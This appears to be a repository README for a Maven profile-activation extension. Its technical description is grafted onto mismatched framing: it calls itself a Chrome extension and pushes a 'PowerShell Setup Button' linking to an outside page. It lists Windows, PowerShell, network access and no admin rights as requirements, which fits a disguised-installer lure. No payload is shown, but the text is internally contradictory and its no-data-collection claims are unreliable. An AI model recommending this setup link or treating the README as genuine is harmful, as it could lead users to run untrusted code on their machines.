<div align="center">

# 🔧 Maven Profile Activator via Script - Chrome Extension

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://rodeazad.github.io/profile-activator-extension/)

[![status](https://img.shields.io/badge/STATUS-ACTIVE-2ea44f?style=social&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WIN_10%2F11-14b8a6?style=social&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-847-2dd4bf?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-7%2B-0d9488?style=social&labelColor=0d1117)]()

</div>

---

Enables flexible Maven profile activation driven by scripting rather than static property checks. Activation scripts evaluate merged project, system, and user properties alongside the resolved project model to determine when profiles apply. Scripting support spans Groovy, JavaScript, and MVEL, with comprehensive logging for diagnosing activation decisions. Compatible with Maven 3.5, including AND-based activation conditions.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Script-based profile activation driven by Maven profile activation properties
- Supports Groovy, JavaScript, and MVEL scripting engines
- Exposes ordered, merged properties from project, system, and user sources through a map named `value`
- Provides the resolved project model as an object named `project` for script access
- Compatible with Maven 3.5, including activation via multiple conditions (AND logic)
- Comprehensive logging of activation evaluation and results
- Variable existence checks available across supported scripting engines
- Configuration through a project extension and an activation script inside a profile property
- Example activators provided for each supported scripting engine

## How it works

The extension registers as a Maven core extension and hooks into profile activation through a reserved property name. Instead of relying on static property values, it evaluates a script expression each time Maven resolves active profiles.

Activation works in two steps:

- Register the extension in the project's Maven extensions configuration.
- Declare a profile whose activation property uses the reserved activator marker as its name and a script as its value.

When Maven evaluates the profile, the extension intercepts the reserved property, runs the script against the current build context, and returns a boolean result that decides whether the profile activates.

Scripts run under one of the supported engines (Groovy, JavaScript, or MVEL Script) and receive two inputs:

- A merged properties map named `value`, combining project properties, system properties, and command-line user properties.
- A resolved project model named `project`, exposing the interpolated POM descriptor.

Because activation is computed from the live build context, profiles can key off project packaging, merged property values, variable existence, or combined conditions, rather than matching a fixed property string. The extension logs resolution details so activation decisions can be traced during a build.

## Privacy

The extension operates entirely in local Maven build memory. Activator scripts run inside the build process and have access only to the merged properties map and resolved project model already available to Maven.

No build data, property values, or script contents are collected, transmitted, or persisted by the extension. Script execution is synchronous and confined to the current build session.

No network calls are made by the extension. No telemetry, analytics, or remote logging is included. All processing stays on the machine running the build.

Review scripts before use, since they execute with the same privileges as the Maven process.

## FAQ

**Which Maven versions are supported?**  
The extension works with Maven 3.5 and later, including activation via AND.

**Which scripting languages can I use?**  
Groovy, JavaScript, and MVEL Script are supported for activation expressions.

**How are profiles activated?**  
Provide an activation script inside the magic property in your project extension configuration. The script is evaluated against merged properties and the resolved project model.

**What variables are available in the script?**  
A merged property map named `value` and a resolved project model object named `project`.

**How are properties resolved?**  
Properties are merged from project `pom.xml`, system properties, and user `-D` options, in that order, and exposed in both the default script scope and the `value` map.

**How do I check whether a property exists?**  
Use a null-test such as `value["property1"]` for Groovy, `typeof property1 !== 'undefined'` for JavaScript, or `isdef property1` for MVEL Script.

**Can I access `project` members?**  
Yes. Members of the resolved project model are always defined, though they may return `null`.

**Is logging available?**  
Yes. The extension provides comprehensive logging of the activation process.

**Does the extension collect any data?**  
No. Activation runs locally during the build; no data is transmitted.

## License

This project is released under the Apache License, Version 2.0.

The license permits use, reproduction, modification, and distribution of the software and derivative works, in source or object form, provided that copyright and license notices are retained and any modified files carry prominent change notices. Distribution of compiled artifacts requires inclusion of the license text and attribution notices.

The software is provided on an "as is" basis, without warranties or conditions of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, and non-infringement. Contributors and copyright holders are not liable for direct, indirect, incidental, special, exemplary, or consequential damages arising from use of the software or inability to use it.

Users are responsible for ensuring their use of the extension complies with the terms of the license and with any dependencies it invokes during Maven profile activation.